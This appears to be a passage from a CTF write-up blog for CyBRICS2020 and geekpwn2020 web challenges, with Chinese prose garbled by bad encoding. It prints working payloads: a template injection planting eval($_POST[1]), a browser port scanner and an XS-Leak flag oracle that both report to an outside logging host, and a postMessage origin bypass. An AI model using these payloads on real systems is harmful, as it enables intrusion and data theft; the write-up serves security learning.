<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s&#x27;</span>, <span class="variable">$field</span>)) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="string">&quot;BAD&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$value</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$field</span>;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">9999999999999999999:1.0E+25</span><br><span class="line">1/0:INF</span><br><span class="line">0/0:NAN</span><br><span class="line">log(0):-INF</span><br></pre></td></tr></table></figure>


<p>newtemplate.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$html</span>, <span class="string">&#x27;&lt;?&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$error</span> = <span class="string">&quot;Bad chars&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">file_put_contents(<span class="string">&quot;calcs/<span class="subst">$userid</span>/templates/<span class="subst">$uuid</span>.html&quot;</span>, <span class="variable">$html</span>);</span><br></pre></td></tr></table></figure>

<p>calc.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">&quot;calcs/<span class="subst">$userid</span>/<span class="subst">$calc</span>.php&quot;</span>, <span class="string">&quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)(<span class="subst">$field</span>))?&gt;;&lt;/script&gt;\n&quot;</span> . file_get_contents(<span class="string">&quot;inc/calclib.html&quot;</span>) . file_get_contents(<span class="string">&quot;calcs/<span class="subst">$userid</span>/templates/<span class="subst">$template</span>.html&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>htmlè½¬phpå¤„ï¼Œåˆ©ç”¨<code>/*</code>ç ´åç»“æ„ï¼Œ<code>file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;))</code>å¤„<code>*/</code>æ”¶å°¾ï¼Œäºæ˜¯ç»•è¿‡æˆåŠŸ</p>
<p>æ–°å»ºtemplate:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*/)).eval($_POST[1])?&gt;</span><br><span class="line">$requiredBlocks = [</span><br><span class="line">            &#x27;id=&quot;back&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;field&quot; name=&quot;field&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit0&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit1&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit2&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit3&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit4&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit5&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit6&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit7&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit8&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit9&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;plus&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;equals&quot;&#x27;,</span><br><span class="line">        ];</span><br></pre></td></tr></table></figure>

<p>å‘calc post:<br><code>field=1/*&amp;share=1</code></p>
<p>flag:cybrics{5aMe_7h1ng_W3_d0_3Ve5y_n16ht_P1nKY.Try_2_t4k3_0vEr_t3h_w0RLd}</p>
<h2 id="Developerâ€™s-Laptop"><a href="#Developerâ€™s-Laptop" class="headerlink" title="Developerâ€™s Laptop"></a>Developerâ€™s Laptop</h2><p>çœ‹é¢˜ç›®æ ·å­æ˜¯xssé¢˜?SSRF?</p>
<p>æµè§ˆå™¨ä¿¡æ¯ï¼šHeadlessChrome/79.0.3945.79 </p>
<p>å¡«å†™è„šæœ¬ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;form-control&quot;</span>);a[<span class="number">1</span>].value=<span class="string">&quot;WQLSaidXUtQAfD6ptJc7Yg&quot;</span>;a[<span class="number">0</span>].value=<span class="string">&quot;http://ccreater.top:60000&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿”å›åŒ…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HEAD / HTTP/1.1</span><br><span class="line">Host: ccreater.top:60000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.79 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Origin: prod.free-design-feedback-cybrics2020.ctf.su</span><br><span class="line">Referer: http://prod.free-design-feedback-cybrics2020.ctf.su</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ç­‰ç­‰å¼€å‘äººå‘˜çš„ç”µè„‘ï¼Ÿè‚¯å®šä¸€å †æœåŠ¡ï¼Œå†…ç½‘æ‰«æï¼</p>
<p>httpæœåŠ¡æ‰«æï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    </span><br><span class="line">&lt;script&gt;</span><br><span class="line">var from = 1;</span><br><span class="line">var complete = true;</span><br><span class="line">var clear = false;</span><br><span class="line">function check(text)&#123;</span><br><span class="line">    var linkEl = document.head.querySelector(&#x27;link[href*=&quot;&#x27;+text+&#x27;&quot;&#x27;);</span><br><span class="line">    var cssLoaded = Boolean(linkEl.sheet);</span><br><span class="line">    linkEl.addEventListener(&#x27;load&#x27;, function () &#123;</span><br><span class="line">        console.log(text)</span><br><span class="line">        // log</span><br><span class="line">		fetch(&quot;http://ccreater.top:60010/log.php?log=&quot;+text)</span><br><span class="line">			.then(r=&gt;r.text())</span><br><span class="line">			.then(d=&gt;&#123;console.log(&quot;log success&quot;)&#125;)</span><br><span class="line">		// log end</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">function clearstyle(clear_from ,clear_to)&#123;</span><br><span class="line">	clear = true;</span><br><span class="line">	console.log(&quot;clear task start&quot;);</span><br><span class="line">	while(clear_to&lt;=clear_from)&#123;</span><br><span class="line">            document.head.querySelector(&#x27;link[href$=&quot;:&#x27;+clear_to+&#x27;&quot;&#x27;).remove();</span><br><span class="line">			clear_to++;</span><br><span class="line">    &#125;</span><br><span class="line">	clear = false;</span><br><span class="line">	console.log(&quot;clear task end&quot;);</span><br><span class="line">&#125;</span><br><span class="line">function make(text)&#123;</span><br><span class="line">    head = document.getElementsByTagName(&#x27;head&#x27;)[0];</span><br><span class="line">	var port = text;</span><br><span class="line">    var url = &quot;http://127.0.0.1:&quot;+port,</span><br><span class="line">    link = document.createElement(&#x27;link&#x27;);</span><br><span class="line">    link.rel = &quot;stylesheet&quot;;</span><br><span class="line">    link.href = url;</span><br><span class="line">    head.appendChild(link);</span><br><span class="line">    check(text);</span><br><span class="line">&#125;</span><br><span class="line">async function scan()&#123;</span><br><span class="line">	var to = from + 80 &gt; 65535 ? 65535 : from + 80;</span><br><span class="line">	for(var i=from;i&lt;to;i++)&#123;</span><br><span class="line">		make(String(i));</span><br><span class="line">	&#125;</span><br><span class="line">	from +=80;</span><br><span class="line">	setTimeout(()=&gt;&#123;clearstyle(from,to);&#125;,5000);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">async function listener ()&#123;</span><br><span class="line">	console.log(&quot;listener works,from:&quot;+from+&quot;,complete:&quot;+complete);</span><br><span class="line">	if(from &lt; 65535)&#123;</span><br><span class="line">		setTimeout(listener,5000);</span><br><span class="line">		if(complete &amp;&amp; !clear)&#123;</span><br><span class="line">			console.log(&quot;new task!&quot;);</span><br><span class="line">			scan()</span><br><span class="line">				.then(()=&gt;&#123;complete = true;&#125;)</span><br><span class="line">			complete = false;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">listener()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>è™½ç„¶æˆ‘çŒœåˆ°äº†æœ‰å†…ç½‘æœåŠ¡ä½†æ˜¯åˆ°æœ€åæˆ‘è¿˜æ˜¯æ²¡æœ‰æ‰«åˆ°ã€‚ã€‚</p>
<p>è„šæœ¬åœ¨æœ¬åœ°æ˜¯å¯ä»¥è·‘çš„ï¼Œä½†æ˜¯æœåŠ¡å™¨ä¸Šå°±ä¸è¡Œï¼Œå¯èƒ½æ˜¯å› ä¸ºæœ‰æ—¶é—´é™åˆ¶å§ï¼Œé—æ†¾ã€‚</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/07/28/CyBRICS2020/" data-id="ckw7zp3xp001eftn71qgr1gte" data-title="CyBRICS2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-geekpwn2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/18/geekpwn2020/" class="article-date">
  <time class="dt-published" datetime="2020-07-18T16:00:00.000Z" itemprop="datePublished">2020-07-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/18/geekpwn2020/">geekpwn2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="geekpwn-2020çƒ­èº«èµ›"><a href="#geekpwn-2020çƒ­èº«èµ›" class="headerlink" title="geekpwn 2020çƒ­èº«èµ›"></a>geekpwn 2020çƒ­èº«èµ›</h1><h2 id="cosplay"><a href="#cosplay" class="headerlink" title="cosplay"></a>cosplay</h2><p>ç›´æ¥ç”¨cosçš„apiè¯»å–æ–‡ä»¶</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cos.getBucket(&#123;</span><br><span class="line">    <span class="attr">Bucket</span>: Bucket,</span><br><span class="line">    <span class="attr">Region</span>: Region,</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err || data.Contents);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cos.getObject(&#123;</span><br><span class="line">    <span class="attr">Bucket</span>: Bucket,</span><br><span class="line">    <span class="attr">Region</span>: Region,</span><br><span class="line">    <span class="attr">Key</span>: <span class="string">&#x27;f1L9@/flag.txt&#x27;</span>,</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err || data.Body);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="noXss2020"><a href="#noXss2020" class="headerlink" title="noXss2020"></a>noXss2020</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, Response</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getenv</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">DATASET = &#123;</span><br><span class="line">    <span class="number">114</span>: <span class="string">&#x27;514&#x27;</span>,</span><br><span class="line">    <span class="number">810</span>: <span class="string">&#x27;8931919&#x27;</span>,</span><br><span class="line">    <span class="number">2017</span>: <span class="string">&#x27;https://blog.cal1.cn/post/RCTF%202017%20rCDN%20%26%20noxss%20writeup&#x27;</span>,</span><br><span class="line">    <span class="number">2019</span>: <span class="string">&#x27;https://hackmd.io/IlzCicHXSN-MXl2JLCYr0g?view&#x27;</span>,</span><br><span class="line">    <span class="number">2020</span>: <span class="string">&#x27;flag&#123;2333333333&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_host</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_handler</span>():</span></span><br><span class="line">    keyword = request.args.get(<span class="string">&#x27;keyword&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> keyword <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(DATASET)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> DATASET:</span><br><span class="line">            <span class="keyword">if</span> keyword <span class="keyword">in</span> DATASET[i]:</span><br><span class="line">                ret[i] = DATASET[i]</span><br><span class="line">        <span class="keyword">return</span> jsonify(ret), <span class="number">200</span> <span class="keyword">if</span> <span class="built_in">len</span>(ret) <span class="keyword">else</span> <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_security_headers</span>(<span class="params">resp</span>):</span></span><br><span class="line">    resp.headers[<span class="string">&#x27;X-Frame-Options&#x27;</span>] = <span class="string">&#x27;sameorigin&#x27;</span></span><br><span class="line">    resp.headers[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="string">&#x27;default-src \&#x27;self\&#x27;; frame-src https://www.youtube.com&#x27;</span></span><br><span class="line">    resp.headers[<span class="string">&#x27;X-Content-Type-Options&#x27;</span>] = <span class="string">&#x27;nosniff&#x27;</span></span><br><span class="line">    resp.headers[<span class="string">&#x27;Referrer-Policy&#x27;</span>] = <span class="string">&#x27;same-origin&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">3000</span>, )</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>æˆ‘ä»¬æ³¨æ„åˆ°searchæ˜¯é€šè¿‡inæ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ï¼Œå¹¶è¿”å›404æˆ–200</p>
<p>è™½ç„¶<code>http://noxss2020.cal1.cn:3000/</code>æœ‰cors,ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸éœ€è¦ä»–è¿”å›çš„å†…å®¹ï¼Œæˆ‘ä»¬åªéœ€è¦çŠ¶æ€ç ï¼Œè¿™æ ·å°±ç®€å•å¤šäº†ã€‚æˆ‘ä»¬å°†é¡µé¢å½“æˆcssæ¥åŠ è½½ï¼Œé€šè¿‡æ˜¯å¦åŠ è½½æˆåŠŸæ¥åˆ¤æ–­çŠ¶æ€ç </p>
<p>payload:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> guess=<span class="string">&quot;flag&quot;</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ok=<span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">text</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> linkEl = <span class="built_in">document</span>.head.querySelector(<span class="string">&#x27;link[href*=&quot;&#x27;</span>+text+<span class="string">&#x27;&quot;&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> cssLoaded = <span class="built_in">Boolean</span>(linkEl.sheet);</span></span><br><span class="line"><span class="javascript">    linkEl.addEventListener(<span class="string">&#x27;load&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        </span></span><br><span class="line"><span class="javascript">        guess=<span class="built_in">unescape</span>(text);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(guess)</span></span><br><span class="line"><span class="javascript">        ok=<span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(guess.endsWith(<span class="string">&quot;&#125;&quot;</span>))&#123;</span></span><br><span class="line"><span class="javascript">            location=<span class="string">&quot;http://ccreater.top:60010/log.php?log=&quot;</span>+guess;</span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> s = guess.substr(<span class="number">0</span>,guess.length-<span class="number">1</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span>(tmp=<span class="built_in">document</span>.head.querySelector(<span class="string">&#x27;link[href*=&quot;&#x27;</span>+s+<span class="string">&#x27;&quot;&#x27;</span>))&#123;</span></span><br><span class="line"><span class="javascript">            tmp.remove();</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        fuzz()</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params">text</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;head&#x27;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> url = <span class="string">&quot;http://127.0.0.1:3000/search?keyword=&quot;</span>+<span class="built_in">escape</span>(text),</span></span><br><span class="line"><span class="javascript">    link = <span class="built_in">document</span>.createElement(<span class="string">&#x27;link&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    link.rel = <span class="string">&quot;stylesheet&quot;</span>;</span></span><br><span class="line"><span class="javascript">    link.href = url;</span></span><br><span class="line"><span class="javascript">    head.appendChild(link);</span></span><br><span class="line"><span class="javascript">    check(<span class="built_in">escape</span>(text));</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">fuzz</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(i <span class="keyword">of</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&quot;</span>)&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(make(guess+i))&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">true</span></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    fuzz()</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">fuzz()</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="umsg"><a href="#umsg" class="headerlink" title="umsg"></a>umsg</h2><p>é˜…è¯»ä»£ç å‘ç°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function(e, t, r) &#123;</span><br><span class="line">        &quot;use strict&quot;;</span><br><span class="line">        r.r(t);</span><br><span class="line">        r(91);</span><br><span class="line">        var n = &#123;</span><br><span class="line">            mounted: function() &#123;</span><br><span class="line">                window.addEventListener(&quot;message&quot;, (function(e) &#123;</span><br><span class="line">                    if (e.origin.match(&quot;http://umsg.iffi.top&quot;))</span><br><span class="line">                        switch (e.data.action) &#123;</span><br><span class="line">                        case &quot;append&quot;:</span><br><span class="line">                            return void (document.getElementsByTagName(&quot;main&quot;)[0].innerHTML += e.data.payload);</span><br><span class="line">                        case &quot;debug&quot;:</span><br><span class="line">                            return void console.log(e.data.payload);</span><br><span class="line">                        case &quot;ping&quot;:</span><br><span class="line">                            return void e.source.postMessage(&quot;pong&quot;, &quot;*&quot;)</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ), !1),</span><br><span class="line">                postMessage(&#123;</span><br><span class="line">                    action: &quot;ping&quot;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨é¡µé¢ä¸­åµŒå…¥iframeæ¥postMessage,ä»è€Œæ’å…¥æ¶æ„å†…å®¹ï¼Œå”¯ä¸€çš„éšœç¢æ˜¯ï¼š<code>e.origin.match(&quot;http://umsg.iffi.top&quot;)</code></p>
<p>å› ä¸ºmatchæ˜¯ä¸€ä¸ªæ­£åˆ™åŒ¹é…å‡½æ•°ï¼Œæ‰€ä»¥æ„é€ <code>http://umsg_iffi_top.evildomain</code>æ¥ç»•è¿‡</p>
<p>payload:</p>
